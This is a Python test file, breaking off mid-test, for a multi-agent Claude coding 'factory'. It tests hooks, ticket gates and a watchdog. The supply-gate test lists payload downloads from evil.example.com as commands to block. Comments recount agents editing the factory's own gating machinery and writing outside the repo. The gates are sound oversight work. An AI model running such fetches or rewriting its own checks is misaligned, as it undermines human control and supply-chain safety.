        assert "permission" in ev["body"], ev
        # someone else's permission prompt is not our business
        _hook(NOTIFY_STOP, {"hook_event_name": "Notification",
                            "session_id": "sess-other",
                            "message": "Claude needs your permission to use "
                                       "WebFetch"}, tmp)
        assert len(open(events).read().splitlines()) == 1


def test_notify_hook_pushes_askuserquestion_with_options():
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        with open(os.path.join(af, "tracker", "ORCHESTRATOR_SESSION"), "w") as f:
            f.write("sess-orch\n")
        ask = {"hook_event_name": "PreToolUse", "session_id": "sess-orch",
               "tool_name": "AskUserQuestion",
               "tool_input": {"questions": [{
                   "question": "M2 is verified — merge it?",
                   "options": [{"label": "Merge"}, {"label": "Revise"}]}]}}
        _hook(NOTIFY_STOP, ask, tmp)
        ev = json.loads(open(os.path.join(af, "tracker", "events.jsonl")).read())
        assert ev["title"] == "Factory question", ev
        assert "merge it?" in ev["body"] and "Merge / Revise" in ev["body"], ev
        # other PreToolUse tools are not questions — no event
        _hook(NOTIFY_STOP, {**ask, "tool_name": "Bash"}, tmp)
        assert len(open(os.path.join(af, "tracker",
                                     "events.jsonl")).read().splitlines()) == 1


def test_notify_hook_question_pushes_even_while_agents_fly():
    # An explicit AskUserQuestion blocks the run no matter what background
    # agents are doing — it always pushes.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        with open(os.path.join(af, "tracker", "ORCHESTRATOR_SESSION"), "w") as f:
            f.write("sess-orch\n")
        from datetime import datetime, timezone
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        with open(os.path.join(af, "tracker", "spawn_log.tsv"), "w") as f:
            f.write("%s\tbuilder\tTASK-0001\tspawned\n" % ts)
        ask = {"hook_event_name": "PreToolUse", "session_id": "sess-orch",
               "tool_name": "AskUserQuestion",
               "tool_input": {"questions": [{"question": "merge?", "options": []}]}}
        _hook(NOTIFY_STOP, ask, tmp)
        events = os.path.join(af, "tracker", "events.jsonl")
        assert len(open(events).read().splitlines()) == 1


def test_notify_hook_dedupes_notification_refires():
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        with open(os.path.join(af, "tracker", "ORCHESTRATOR_SESSION"), "w") as f:
            f.write("sess-orch\n")
        note = {"hook_event_name": "Notification", "session_id": "sess-orch",
                "message": "Claude needs your permission to use Bash"}
        _hook(NOTIFY_STOP, note, tmp)
        _hook(NOTIFY_STOP, note, tmp)  # undocumented refire — must not double
        lines = open(os.path.join(af, "tracker", "events.jsonl")).read().splitlines()
        assert len(lines) == 1, lines


def test_notify_hook_folds_question_permission_pair_into_one_push():
    # kspace 2026-08-12: both AskUserQuestion pushes were chased 6s later by
    # a bare "Claude needs your permission" for the dialog itself — the
    # question push already carried the full ask, so the pair is one block
    # and gets one push.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        with open(os.path.join(af, "tracker", "ORCHESTRATOR_SESSION"), "w") as f:
            f.write("sess-orch\n")
        _hook(NOTIFY_STOP, {"hook_event_name": "PreToolUse",
                            "session_id": "sess-orch",
                            "tool_name": "AskUserQuestion",
                            "tool_input": {"questions": [{
                                "question": "merge?", "options": []}]}}, tmp)
        _hook(NOTIFY_STOP, {"hook_event_name": "Notification",
                            "session_id": "sess-orch",
                            "message": "Claude needs your permission"}, tmp)
        events = os.path.join(af, "tracker", "events.jsonl")
        lines = open(events).read().splitlines()
        assert len(lines) == 1, lines
        assert json.loads(lines[0])["title"] == "Factory question", lines


# --- wake.py (phone-reply delivery + headless resume) --------------------------


def test_wake_files_reply_and_skips_wake_without_run():
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        os.remove(os.path.join(af, "tracker", "RUNNING"))
        _run(af, "wake.py", "Use tailwind, and merge M2.", "--source", "phone")
        notes = os.listdir(os.path.join(af, "tracker", "inbox"))
        assert len(notes) == 1 and notes[0].endswith("-phone-reply.md"), notes
        body = open(os.path.join(af, "tracker", "inbox", notes[0])).read()
        assert "Use tailwind, and merge M2." in body
        ev = json.loads(open(os.path.join(af, "tracker", "events.jsonl")).read())
        assert ev["kind"] == "reply_filed", ev
        assert not os.path.exists(os.path.join(af, "tracker", "SESSION_LOCK"))


def test_wake_relaunches_and_never_kills_a_reused_pid():
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)  # leaves RUNNING in place
        # the lock holds a live PID that is NOT a claude session (this test
        # runner) — wake must not kill it, only take over the lock
        with open(os.path.join(af, "tracker", "SESSION_LOCK"), "w") as f:
            f.write("%d\n" % os.getpid())
        os.environ["CLAUDE_BIN"] = "/usr/bin/true"
        os.environ["AF_NO_TMUX"] = "1"   # pin the headless-fallback path
        try:
            _run(af, "wake.py", "ship it")
        finally:
            del os.environ["CLAUDE_BIN"], os.environ["AF_NO_TMUX"]
        events = [json.loads(l) for l in
                  open(os.path.join(af, "tracker", "events.jsonl"))]
        assert [e["kind"] for e in events] == ["resumed"], events
        lock = open(os.path.join(af, "tracker", "SESSION_LOCK")).read().strip()
        assert lock.isdigit() and int(lock) != os.getpid(), lock
        assert "wake.py: remote reply delivered" in \
            open(os.path.join(af, "tracker", "watchdog.log")).read()


def test_wake_tmux_relaunch_writes_attach_and_lock():
    import shutil
    if not shutil.which("tmux"):
        return  # no tmux on this machine — the fallback test above covers it
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)  # leaves RUNNING in place, no SESSION_LOCK
        sess = "af-" + re.sub(r"[^a-z0-9]+", "-",
                              os.path.basename(tmp).lower()).strip("-")
        fake = os.path.join(tmp, "fakeclaude")
        with open(fake, "w") as f:
            f.write("#!/bin/sh\nsleep 30\n")
        os.chmod(fake, 0o755)
        os.environ["CLAUDE_BIN"] = fake
        try:
            _run(af, "wake.py", "go")
            attach = open(os.path.join(af, "tracker", "ATTACH")).read().strip()
            assert attach == "tmux attach -t " + sess, attach
            lock = open(os.path.join(af, "tracker", "SESSION_LOCK")).read().strip()
            r = subprocess.run(["tmux", "list-panes", "-t", sess,
                                "-F", "#{pane_pid}"],
                               capture_output=True, text=True)
            assert lock == r.stdout.strip(), (lock, r.stdout)
        finally:
            del os.environ["CLAUDE_BIN"]
            subprocess.run(["tmux", "kill-session", "-t", sess],
                           capture_output=True)


TICKET_GATE = os.path.join(lib.PRODUCT, ".claude", "hooks", "ticket_gate.py")


def test_config_gate_blocks_run_yaml_only_while_running():
    with tempfile.TemporaryDirectory() as td:
        proj = os.path.realpath(td)
        os.makedirs(os.path.join(proj, "agenticflow", "tracker"))
        payload = {"hook_event_name": "PreToolUse", "tool_name": "Edit",
                   "tool_input": {"file_path":
                                  os.path.join(proj, "agenticflow", "run.yaml"),
                                  "old_string": "builders: 1",
                                  "new_string": "builders: 4"}}
        r = _hook(TICKET_GATE, payload, proj)   # no RUNNING: allowed
        assert r.returncode == 0, r.stderr
        open(os.path.join(proj, "agenticflow", "tracker", "RUNNING"), "w").close()
        r = _hook(TICKET_GATE, payload, proj)   # live run: blocked, loudly
        assert r.returncode == 2, (r.returncode, r.stderr)
        assert "run.yaml is the human's" in r.stderr
        fires = open(os.path.join(proj, "agenticflow", "tracker",
                                  "gate_fires.tsv")).read()
        assert "run.yaml" in fires


def test_landing_dep_gate_holds_unmet_foundation():
    # 2026-07-19 (quiz TASK-0045 class): depends_on gated ASSIGNMENT but not
    # LANDING — a ticket whose dep was retro-added/regressed while it sat
    # `built` merged ahead of its foundation. The landing step now holds the
    # merge until every dep is done; clearing the edge releases it next tick.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        for i in range(2):
            _run(af, "ticket.py", "new", "--type", "TASK", "--title",
                 "t%d" % i, "--as", "architect", "--scope", "app",
                 "--criteria", "`test -f app/main.py` exits 0")
        plan = json.loads(_run(af, "dispatch.py"))
        assert plan["assign_to_builders"] == ["TASK-0001", "TASK-0002"]
        wt = os.path.join(tmp, plan["worktrees"]["TASK-0002"])
        _run(af, "ticket.py", "claim", "TASK-0002", "--as", "builder-1")
        with open(os.path.join(wt, "app", "later.py"), "w") as f:
            f.write("x = 2\n")
        for args in (["add", "-A"], ["commit", "-q", "-m", "TASK-0002"]):
            subprocess.run(["git", "-C", wt] + args, check=True,
                           capture_output=True)
        _run(af, "ticket.py", "transition", "TASK-0002", "built",
             "--as", "builder-1", "--note", "handoff")
        # the dep appears while the ticket sits built (the incident shape)
        _run(af, "ticket.py", "set-depends", "TASK-0002", "--depends",
             "TASK-0001", "--note", "retro-added foundation",
             "--as", "architect")
        plan = json.loads(_run(af, "dispatch.py"))
        held = [f for f in plan["flags"] if f["kind"] == "land_deps_unmet"]
        assert held and held[0]["id"] == "TASK-0002" \
            and held[0]["deps"] == ["TASK-0001"], plan["flags"]
        assert not os.path.exists(os.path.join(tmp, "app", "later.py")), \
            "held ticket must not land"
        # foundation edge cleared -> lands on the next tick
        _run(af, "ticket.py", "set-depends", "TASK-0002", "--depends", "",
             "--note", "foundation folded in", "--as", "architect")
        plan = json.loads(_run(af, "dispatch.py"))
        assert any(f["kind"] == "landed" and f["id"] == "TASK-0002"
                   for f in plan["flags"]), plan["flags"]
        assert os.path.exists(os.path.join(tmp, "app", "later.py"))


def test_compact_threshold_raise_and_not_smaller_guard():
    # 2026-07-31 (Ben's design, replacing measure-History-only): dense
    # tickets are legitimate — the compactor attempts, and on concluding
    # irreducibility RAISES that ticket's own threshold (audit-logged,
    # centrally recorded) so it stops re-flagging. compact itself refuses a
    # summary that is not smaller than what it replaces (BUG-0016 grew 42%).
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        _run(af, "ticket.py", "new", "--type", "TASK", "--title", "dense",
             "--as", "architect", "--scope", "app",
             "--criteria", "`test -f app/main.py` exits 0")
        filler = "measured fact %d: " + "x" * 300
        for i in range(30):
            _run(af, "ticket.py", "comment", "TASK-0001", "--as", "builder-1",
                 "--note", filler % i)
        plan = json.loads(_run(af, "dispatch.py"))
        assert any(f["kind"] == "compact_candidate" and f["id"] == "TASK-0001"
                   for f in plan["flags"]), plan["flags"]
        # role gate: a builder may not raise
        r = subprocess.run(
            [sys.executable, os.path.join(af, "scripts", "ticket.py"),
             "raise-compact-threshold", "TASK-0001", "--bytes", "25000",
             "--as", "builder-1", "--note", "n"],
            capture_output=True, text=True)
        assert r.returncode != 0 and "compactor" in r.stderr
        _run(af, "ticket.py", "raise-compact-threshold", "TASK-0001",
             "--bytes", "25000", "--as", "compactor",
             "--note", "irreducible: every fact load-bearing")
        plan = json.loads(_run(af, "dispatch.py"))
        assert not any(f["kind"] == "compact_candidate"
                       for f in plan["flags"]), plan["flags"]
        raises = open(os.path.join(af, "tracker", "compact_raises.tsv")).read()
        assert "TASK-0001\t8000\t25000" in raises
        # not-smaller guard: a summary >= the raw History is refused and
        # points at the raise path instead
        r = subprocess.run(
            [sys.executable, os.path.join(af, "scripts", "ticket.py"),
             "compact", "TASK-0001", "--as", "compactor",
             "--summary", "State: dense. Tried: all. DEAD ENDS: none.\n"
             + "padding " * 3000],
            capture_output=True, text=True)
        assert r.returncode != 0 and "raise-compact-threshold" in r.stderr
        assert not os.path.exists(
            os.path.join(af, "tracker", "notes", "TASK-0001.md")), \
            "refused compaction must not append to the notes file"


def test_supply_gate_archive_fetch_and_extract():
    # 2026-07-18 hole (DEP-0001): `curl -O … && unzip` landed a 5.4GB
    # toolchain with no gate fire. A SAVED archive/installer download (or a
    # fetch piped into tar) is now an install event: vetted-provenance hosts
    # auto-pass WITH a recorded gate_fires line, everything else blocks into
    # the DEP funnel. Extractors are recorded, never blocked. Plain
    # non-archive downloads stay ungated.
    with tempfile.TemporaryDirectory() as proj:
        docs = os.path.join(proj, "agenticflow", "docs")
        trk = os.path.join(proj, "agenticflow", "tracker")
        os.makedirs(docs)
        os.makedirs(trk)
        with open(os.path.join(docs, "ALLOWED_DEPS.md"), "w") as f:
            f.write("- archive:dl.google.com (Android toolchain provenance)\n")
        cases = [
            ("curl -LO https://dl.google.com/android/cmdline-tools.zip", 0),
            ("curl -LO https://evil.example.com/toolchain.zip", 2),
            ("wget https://evil.example.com/payload.tar.gz", 2),
            ("curl -sL https://evil.example.com/x.tgz | tar xz", 2),
            ("curl -o notes.html https://example.com/page", 0),   # not archive
            ("wget https://example.com/data.csv", 0),             # not archive
            ("unzip cmdline-tools.zip -d ~/sdk", 0),              # record-only
            ("tar -xzf vendored.tar.gz", 0),                      # record-only
            ("tar -czf backup.tar.gz app/", 0),                   # create ≠ extract
        ]
        for cmd, want in cases:
            got = _gate(cmd, proj)
            assert got == want, (cmd, got, want)
        fires = open(os.path.join(trk, "gate_fires.tsv")).read()
        assert "recorded: archive fetch" in fires and "vetted host dl.google.com" in fires
        assert "blocked archive fetch from evil.example.com" in fires
        assert "recorded: extract — unzip cmdline-tools.zip" in fires
        assert "tar -czf" not in fires


def test_checks_block_is_authoritative_and_parses():
    # Structured storage (2026-07-31 ruling): a fenced ## Checks block is the
    # command list — nothing scraped, prose never executed, comments skipped.
    body = ("## Acceptance criteria\nthe drill never loses a card. "
            "`rm -rf /` exits 0\n\n## Checks\n```sh\n"
            "# targeted suite\ncd app && .venv/bin/python -m pytest -q tests\n\n"
            "test -f app/static/style.css\n```\n\n## History\n")
    assert lib.checks_commands(body) == [
        "cd app && .venv/bin/python -m pytest -q tests",
        "test -f app/static/style.css"]
    # criteria_commands returns the checks ONLY — the prose span (a
    # would-be scraper hit) is never extracted when a Checks block exists
    assert lib.criteria_commands(body) == lib.checks_commands(body)


def test_checks_fence_survives_backticks_mid_command():
    # kspace TASK-0032 (2026-08-18, severity: blocking): a check validating a
    # fenced receipt legitimately contains ``` mid-line; the unanchored
    # closing-fence match cut the command there, ran the fragment, and
    # silently dropped every later check — green receipts over a subset.
    # The closing fence counts only at column 0 of its own line.
    inner = ("test \"$(sed -n '/^```inventory$/,/^```$/p' r.md "
             "| grep -vc '^```')\" -eq 0")
    body = ("## Description\nx\n\n## Checks\n```sh\n"
            "test -s r.md\n%s\n./node_modules/.bin/tsc --noEmit && npm test\n"
            "```\n\n## History\n" % inner)
    cmds = lib.checks_commands(body)
    assert len(cmds) == 3, cmds
    assert cmds[1] == inner, cmds[1]
    assert cmds[2] == "./node_modules/.bin/tsc --noEmit && npm test", cmds


def test_legacy_parser_venv_path_span_and_quoted_prose():
    # 2026-07-19 Part A: `app/.venv/bin/python …` spans were silently dropped
    # (first token not a starter). 2026-07-20 shape A: the quoted prose form
    # 'grep -q "x" file' exits 0 was dropped (grep not in the prose regex).
    cmds = _criteria("`app/.venv/bin/python -m pytest -q tests` exits 0")
    assert cmds == ["app/.venv/bin/python -m pytest -q tests"], cmds
    cmds = _criteria("'grep -q \"option-row:focus-within\" app/static/app.css' exits 0")
    assert cmds == ['grep -q "option-row:focus-within" app/static/app.css'], cmds
    cmds = _criteria("grep -q DOCTYPE app/templates/base.html exits 0")
    assert cmds == ["grep -q DOCTYPE app/templates/base.html"], cmds


def test_check_defects_count_gates():
    # 2026-07-24: `| wc -l` always exits 0 (false-GREEN, TASK-0007);
    # `grep -c` exits 1 exactly on count zero (false-RED, TASK-0009).
    # The wrapped `test "$(...)" -eq N` form is the sanctioned shape.
    bad_wc = "cd app && grep -rlE 'app\\.css' tests | wc -l"
    bad_grepc = "ls tests | grep -icE 'bug[0-9]'"
    good = "test \"$(cd app && grep -rlE 'app\\.css' tests | wc -l)\" -eq 0"
    assert lib.check_defects([bad_wc]), "unwrapped wc -l must be refused"
    assert lib.check_defects([bad_grepc]), "grep -c must be refused"
    assert not lib.check_defects([good]), "wrapped count form must pass"
    assert not lib.check_defects(["grep -q DOCTYPE app/base.html"]), \
        "plain presence grep (no count flag) must pass"


def test_check_defects_pytest_env():
    # 2026-07-19 B2: pytest without the venv reds on the host interpreter.
    # 2026-07-23: pytest over tests_js/ is unrunnable by construction.
    assert lib.check_defects(["pytest -q tests"])
    assert not lib.check_defects(["cd app && .venv/bin/python -m pytest -q tests"])
    assert lib.check_defects(
        ["cd app && .venv/bin/python -m pytest -q tests_js/test_nav.py"])


def test_check_defects_tsx_scope_cross_check():
    # 2026-07-23 (Notes BUG-0059/0061): a .tsx-only scope signed off by a
    # leaf test the scope never touches greens on the UNCHANGED module.
    scope = ["mobile/ExpensesSummary.tsx"]
    assert lib.check_defects(["node --test tests/expensePeriod.test.ts"], scope)
    assert not lib.check_defects(
        ["grep -q coveredSpanCaption mobile/ExpensesSummary.tsx"], scope)
    # non-tsx scope: the cross-check never fires
    assert not lib.check_defects(["node --test tests/expensePeriod.test.ts"],
                                 ["app/tests"])


def test_vacuous_test_run_detection():
    # Zero tests executed = empty bar = RED, whatever the exit code
    # (criteria rot: a renamed test file otherwise greens forever).
    assert lib.vacuous_test_run("cd app && .venv/bin/python -m pytest -q x",
                                "collected 0 items\nno tests ran in 0.01s")
    assert lib.vacuous_test_run("node --test tests/gone.test.ts",
                                "TAP version 13\n# tests 0\n# pass 0")
    assert lib.vacuous_test_run("node --test tests/gone.test.ts",
                                "ℹ tests 0\nℹ pass 0")
    assert not lib.vacuous_test_run("cd app && .venv/bin/python -m pytest -q x",
                                    "collected 34 items\n34 passed")
    assert not lib.vacuous_test_run("node --test tests/x.test.ts",
                                    "# tests 12\n# pass 12")
    assert not lib.vacuous_test_run("grep -q tests 0 file", "tests 0")


def test_new_birth_gate_refusals_and_checks_block():
    # Every statically-decidable defective form refuses BEFORE any file
    # exists; sound checks land in a fenced ## Checks block; a purely human
    # bar must opt out explicitly.
    import types
    import ticket

    def ns(**kw):
        base = dict(type="TASK", title="t", milestone=None, priority="P2",
                    parent=None, depends="", scope="", description="d",
                    criteria="", check=[], checks_file=None,
                    discovered_from=None, as_role="architect")
        base.update(kw)
        return types.SimpleNamespace(**base)

    with tempfile.TemporaryDirectory() as tmp:
        orig = (lib.TICKETS, lib.ARCHIVE)
        lib.TICKETS, lib.ARCHIVE = tmp, os.path.join(tmp, "arch")
        try:
            refusals = [
                dict(check=["grep -rl x tests | wc -l"]),
                dict(check=["ls tests | grep -icE 'bug'"]),
                dict(check=["pytest -q tests"]),
                dict(criteria="odd `backtick count"),
                dict(criteria="the tile matches its four peers"),  # no opt-out
            ]
            for kw in refusals:
                try:
                    ticket.cmd_new(ns(**kw))
                    assert False, "must refuse: %s" % kw
                except SystemExit as e:
                    assert "ERROR" in str(e), kw
                assert not [f for f in os.listdir(tmp) if f.endswith(".md")], \
                    "refusal must write nothing"
            # sound structured checks: written as a fenced block
            ticket.cmd_new(ns(check=[
                "cd app && .venv/bin/python -m pytest -q tests",
                "test \"$(ls app/tests | grep -c old_)\" -eq 0"]))
            path = os.path.join(tmp, "TASK-0001.md")
            body = open(path).read()
            assert "## Checks\n```sh\n" in body
            assert lib.criteria_commands(body) == [
                "cd app && .venv/bin/python -m pytest -q tests",
                "test \"$(ls app/tests | grep -c old_)\" -eq 0"]
            # explicit human bar: allowed with zero commands
            ticket.cmd_new(ns(criteria="the drill feels instant (human-checkable)"))
            assert os.path.exists(os.path.join(tmp, "TASK-0002.md"))
        finally:
            lib.TICKETS, lib.ARCHIVE = orig


def test_amend_checks_replaces_block_and_invalidates_receipt():
    import types
    import ticket
    with tempfile.TemporaryDirectory() as tmp:
        fake = {"front": {"id": "TASK-9998", "status": "open",
                          "touch_scope": ["app/a.py"]},
                "body": ("## Description\nx\n\n## Acceptance criteria\nprose\n\n"
                         "## Checks\n```sh\ntest -f app/a.py\n```\n\n"
                         "## History\n- created\n"),
                "path": os.path.join(tmp, "TASK-9998.md")}
        rp = os.path.join(tmp, "TASK-9998.json")
        open(rp, "w").close()
        orig = (ticket.get, ticket.lib.write_ticket, ticket.lib.RECEIPTS)
        try:
            ticket.get = lambda tid: fake
            ticket.lib.write_ticket = lambda t: None
            ticket.lib.RECEIPTS = tmp
            ns = types.SimpleNamespace
            try:
                ticket.cmd_amend_checks(ns(id="TASK-9998", as_role="builder-1",
                                           check=["true"], checks_file=None,
                                           note="n"))
                assert False, "builder amendment must be refused"
            except SystemExit:
                pass
            try:
                ticket.cmd_amend_checks(ns(id="TASK-9998", as_role="architect",
                                           check=["ls x | wc -l"],
                                           checks_file=None, note="n"))
                assert False, "defective replacement must be refused"
            except SystemExit:
                pass
            ticket.cmd_amend_checks(ns(id="TASK-9998", as_role="architect",
                                       check=["test -f app/b.py"],
                                       checks_file=None, note="split moved it"))
            assert lib.checks_commands(fake["body"]) == ["test -f app/b.py"]
            assert "checks amended: split moved it [was: test -f app/a.py]" \
                in fake["body"]
            assert not os.path.exists(rp), "stale receipt must be deleted"
        finally:
            ticket.get, ticket.lib.write_ticket, ticket.lib.RECEIPTS = orig


def test_artifact_gate_contains_writes_to_the_repo():
    # 2026-07-29 incident: a QA verifying BUG-0024/25 wrote 349MB of raw
    # framebuffer captures into ~/Desktop/Coding/qa-bug*-verify — outside the
    # repo, never cleaned up, found by the human days later. While a run is
    # in flight (RUNNING present) every created file stays inside the repo;
    # the sanctioned space is agenticflow/tracker/evidence/<TICKET>/
    # (gitignored). With no RUNNING the gate is inert — interactive sessions
    # keep their scratchpads.
    def gate(tool, tool_input, proj):
        payload = json.dumps({"tool_name": tool, "tool_input": tool_input,
                              "cwd": proj})
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj)
        return subprocess.run([sys.executable, ARTIFACT_GATE], input=payload,
                              capture_output=True, text=True,
                              env=env).returncode
    with tempfile.TemporaryDirectory() as proj:
        proj = os.path.realpath(proj)
        trk = os.path.join(proj, "agenticflow", "tracker")
        os.makedirs(trk)
        stray = os.path.join(os.path.dirname(proj), "qa-verify-stray")
        # no RUNNING: inert, whatever the target
        assert gate("Write", {"file_path": os.path.join(stray, "x.png")},
                    proj) == 0
        open(os.path.join(trk, "RUNNING"), "w").close()
        # file tools: exact path check
        ok = os.path.join(trk, "evidence", "BUG-1", "crop.png")
        assert gate("Write", {"file_path": ok}, proj) == 0
        assert gate("Write", {"file_path": os.path.join(stray, "x.png")},
                    proj) == 2
        assert gate("Edit", {"file_path": "/tmp/qa-scratch/dump.xml"},
                    proj) == 2
        # bash: the obvious write forms, in and out of the repo
        cases = [
            # device-targeting adb pins -s here (the unpinned form is its own
            # refusal, tested separately) so these isolate the WRITE check
            ("adb -s emulator-5560 exec-out screencap -p > "
             "agenticflow/tracker/evidence/BUG-1/fb.png", 0),
            ("adb -s emulator-5560 exec-out screencap -p > "
             "../qa-verify-stray/fb.png", 2),
            ("mkdir -p %s" % stray, 2),
            ("cp app/build/app.apk /tmp/mine.apk", 2),
            ("curl -o /tmp/page.html https://example.com/page", 2),
            ("adb -s emulator-5560 pull /sdcard/dump.xml /tmp/dump.xml", 2),
            ("echo hi > /dev/null", 0),
            ("cd app && .venv/bin/python -m pytest -q tests 2>&1", 0),
            ("git status", 0),
        ]
        for cmd, want in cases:
            got = gate("Bash", {"command": cmd}, proj)
            assert got == want, (cmd, got, want)
        fires = open(os.path.join(trk, "gate_fires.tsv")).read()
        assert "artifact_gate\tblocked write outside repo" in fires


def test_factory_scope_refused_at_birth_and_amend():
    # 2026-08: the workout run filed 15 machinery-scoped tickets and landed
    # ~3000 lines on ticket.py/lib_ticket.py/receipt.py — the factory
    # repairing itself, forking the installed kit so no upgrade lands
    # cleanly. Machinery defects route to tracker/proposals/ for the human;
    # ticket.py refuses the scope at the only cheap moment.
    assert lib.factory_scope_offenders(
        ["app/x.py", "tests/y.py", "agenticflow/tracker/evidence/BUG-1",
         "agenticflow/docs/vision/LOOK_AND_FEEL.md"]) == []
    assert lib.factory_scope_offenders(
        ["app/x.py", "agenticflow/scripts/ticket.py"]) == \
        ["agenticflow/scripts/ticket.py"]
    for entry in ("./agenticflow/scripts/lib_ticket.py",
                  ".claude/agents/architect.md", ".claude",
                  "agenticflow/scripts", "agenticflow/run.yaml",
                  "agenticflow/.kit-manifest.tsv"):
        assert lib.factory_scope_offenders([entry]) == [entry], entry
    import ticket
    try:
        ticket._refuse_factory_scope(["agenticflow/scripts/receipt.py"])
        assert False, "machinery scope must be refused"
    except SystemExit as e:
        assert "proposals" in str(e.code)


def test_artifact_gate_blocks_machinery_writes():
    # The factory never repairs itself: while a run is live, writes under
    # agenticflow/scripts/ and .claude/ (and to run.yaml / the manifest)
    # are blocked for every agent — including a worktree's copy of them.
    # State stays open: tracker, notes, evidence.
    def gate(tool, tool_input, proj):
        payload = json.dumps({"tool_name": tool, "tool_input": tool_input,
                              "cwd": proj})
        env = dict(os.environ, CLAUDE_PROJECT_DIR=proj)
        return subprocess.run([sys.executable, ARTIFACT_GATE], input=payload,
                              capture_output=True, text=True,
                              env=env).returncode
    with tempfile.TemporaryDirectory() as proj:
        proj = os.path.realpath(proj)
        trk = os.path.join(proj, "agenticflow", "tracker")
        os.makedirs(trk)
        script = os.path.join(proj, "agenticflow", "scripts", "ticket.py")
        # no RUNNING: inert — interactive sessions edit machinery freely
        assert gate("Edit", {"file_path": script}, proj) == 0
        open(os.path.join(trk, "RUNNING"), "w").close()
        assert gate("Edit", {"file_path": script}, proj) == 2
        assert gate("Write", {"file_path": os.path.join(
            proj, ".claude", "agents", "builder.md")}, proj) == 2
        cases = [
            ("echo x >> agenticflow/scripts/ticket.py", 2),
            ("cp fixed.yaml agenticflow/run.yaml", 2),
            ("tee .claude/settings.json", 2),
            ("echo x >> agenticflow/.worktrees/TASK-1/agenticflow/scripts/ticket.py", 2),
            ("echo x > agenticflow/.worktrees/TASK-1/app/y.py", 0),
            ("mkdir -p agenticflow/tracker/evidence/BUG-1", 0),
            ("echo note > agenticflow/tracker/notes/qa.md", 0),
            ("python3 agenticflow/scripts/ticket.py claim TASK-1 --as builder-1", 0),
        ]
        for cmd, want in cases:
            got = gate("Bash", {"command": cmd}, proj)
            assert got == want, (cmd, got, want)
        fires = open(os.path.join(trk, "gate_fires.tsv")).read()
        assert "blocked machinery write" in fires


def test_dispatch_halts_on_blocking_incident():
    # A machinery defect that stops work pauses the run for the human — the
    # factory neither repairs itself nor limps on self-patched machinery
    # (Ben's ruling, 2026-08-10; production-release behavior is an open
    # question). Only `severity: blocking` frontmatter halts; curator-style
    # proposals (no frontmatter) never do.
    import dispatch
    orig = lib.ROOT
    with tempfile.TemporaryDirectory() as d:
        pdir = os.path.join(d, "tracker", "proposals")
        os.makedirs(pdir)
        try:
            lib.ROOT = d
            assert dispatch.blocking_incidents() == []
            with open(os.path.join(pdir, "2026-08-10-curator-idea.md"),
                      "w") as f:
                f.write("# Serialize folds\n- **Type**: add\n")
            assert dispatch.blocking_incidents() == []
            with open(os.path.join(pdir, "2026-08-10-receipt-misgrade.md"),
                      "w") as f:
                f.write("---\nseverity: blocking\n---\n"
                        "# receipt.py greens a red\n")
            assert dispatch.blocking_incidents() == \
                ["2026-08-10-receipt-misgrade.md"]
        finally:
            lib.ROOT = orig


def test_watchdog_parks_after_repeated_no_progress_relaunches():
    # PARKED (Ben, 2026-08-10): RUNNING conflates "campaign unfinished" with
    # "process live" — endless relaunch of a run that dies on arrival left
    # week-old zombie RUNNING files with every gate armed against the human.
    # After 3 stamped relaunch attempts with no HEARTBEAT progress, the next
    # watchdog firing demotes RUNNING -> PARKED (gates disarm, work kept)
    # and pages instead of relaunching; /ship resume promotes it back.
    import shutil
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)  # leaves RUNNING in place, no SESSION_LOCK
        shutil.copy(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 "factory_watchdog.sh"),
                    os.path.join(af, "scripts", "factory_watchdog.sh"))
        with open(os.path.join(af, "tracker", ".relaunch_attempts"), "w") as f:
            f.write("3\n")
        r = subprocess.run(["/bin/zsh", os.path.join(
            af, "scripts", "factory_watchdog.sh")],
            capture_output=True, text=True)
        assert r.returncode == 0, (r.stdout, r.stderr)
        assert os.path.exists(os.path.join(af, "tracker", "PARKED"))
        assert not os.path.exists(os.path.join(af, "tracker", "RUNNING"))
        assert not os.path.exists(os.path.join(af, "tracker",
                                               ".relaunch_attempts"))
        assert "parked: 3 relaunches with no progress" in \
            open(os.path.join(af, "tracker", "watchdog.log")).read()
        ev = [json.loads(l) for l in
              open(os.path.join(af, "tracker", "events.jsonl"))]
        assert ev[-1]["kind"] == "attention" and "parked" in ev[-1]["title"]
        # dispatch on a parked campaign: halt, and say it is parked
        r = subprocess.run([sys.executable,
                            os.path.join(af, "scripts", "dispatch.py")],
                           capture_output=True, text=True)
        assert r.returncode == 3
        assert "PARKED" in json.loads(r.stdout)["halt"]


def test_transition_note_length_warns_not_refuses():
    # Handoff bound (Ben, 2026-08-10): warn-only — honesty outranks brevity,
    # but 1000-word diff-narration essays were routine.
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.realpath(td)
        af = _factory_repo(tmp)
        tid = _run(af, "ticket.py", "new", "--type", "TASK", "--title", "t",
                   "--as", "architect", "--criteria", "x (human-checkable)",
                   "--scope", "app/main.py").strip().splitlines()[-1]
        r = subprocess.run(
            [sys.executable, os.path.join(af, "scripts", "ticket.py"),
             "transition", tid, "blocked", "--as", "architect",
             "--note", "w" * 3000],
            capture_output=True, text=True)
        assert r.returncode == 0, r.stderr
        assert "WARNING: 3000-char note" in r.stderr
        tid2 = _run(af, "ticket.py", "new", "--type", "TASK", "--title", "u",
                    "--as", "architect", "--criteria", "x (human-checkable)",
                    "--scope", "app/main.py").strip().splitlines()[-1]
        r = subprocess.run(
            [sys.executable, os.path.join(af, "scripts", "ticket.py"),
